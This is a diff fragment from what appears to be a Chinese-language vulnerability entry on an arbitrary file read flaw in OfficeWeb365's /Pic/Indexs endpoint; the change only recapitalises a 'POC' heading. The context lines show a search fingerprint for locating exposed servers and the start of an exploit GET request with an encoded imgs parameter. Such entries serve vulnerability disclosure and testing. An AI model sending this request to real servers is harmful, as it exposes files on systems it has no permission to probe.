@@ -7,7 +7,7 @@ OfficeWeb365 /Pic/Indexs接口处存在任意文件读取漏洞，攻击者可�
 body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
 ```
 
-## poc
+## POC
 ```
 GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
 Host: xx.xx.xx.xx
